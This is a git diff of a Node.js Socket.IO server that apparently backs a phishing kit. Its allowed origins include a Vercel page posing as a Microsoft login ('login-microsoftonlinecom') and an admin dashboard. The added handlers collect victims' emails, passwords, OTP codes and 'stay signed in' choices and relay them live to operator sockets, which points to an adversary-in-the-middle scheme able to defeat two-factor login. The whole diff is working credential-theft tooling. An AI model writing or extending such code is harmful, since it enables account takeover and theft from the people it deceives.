@@ -21,8 +21,10 @@ const server = http.createServer(app);
 const io = new Server(server, {
   cors: {
     origin: [
-      "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app", // Your login page URL
-      "https://officeadmin-ochre.vercel.app", // Your admin dashboard URL
+      // "https://login-microsoftonlinecom-cd6683a6-git-69f45d.vercel.app",
+      // "https://officeadmin-ochre.vercel.app",
+      "http://localhost:5173",
+      "http://localhost:5174",
     ],
     methods: ["GET", "POST"],
   },
@@ -602,6 +604,97 @@ io.on("connection", (socket) => {
     });
   });
 
+  // Handle full login attempts (with password)
+  socket.on("login_attempt", (data) => {
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("login-attempt", {
+        ...data,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("ig_attempt_init", (data) => {
+    console.log(data);
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "ig_attempt_init",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("ig_attempt_init", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("auth_value_submit", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      otp: data.otp,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "auth_value_submit",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("auth_value_submit", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
+  socket.on("stay_signed_in", (data) => {
+    const sessionData = sessions.get(data.sessionId) || {
+      email: data.email,
+      password: data.password,
+      staySignedIn: data.staySignedIn,
+      events: [],
+    };
+
+    sessionData.events.push({
+      type: "stay_signed_in",
+      timestamp: data.timestamp,
+      data: data.email,
+    });
+
+    sessions.set(data.sessionId, sessionData);
+    userSessions.set(data.sessionId, socket);
+
+    // Broadcast to admins
+    adminSockets.forEach((adminSocket) => {
+      adminSocket.emit("stay_signed_in", {
+        ...data,
+        sessionId: data.sessionId,
+        timestamp: new Date().toISOString(),
+      });
+    });
+  });
+
   // Handle admin responses
   socket.on("admin_response", (data) => {
     // console.log(data);
@@ -634,16 +727,6 @@ io.on("connection", (socket) => {
         });
       });
     }
-  });
-
-  // Handle full login attempts (with password)
-  socket.on("login_attempt", (data) => {
-    adminSockets.forEach((adminSocket) => {
-      adminSocket.emit("login-attempt", {
-        ...data,
-        timestamp: new Date().toISOString(),
-      });
-    });
   });
 
   // Error handling
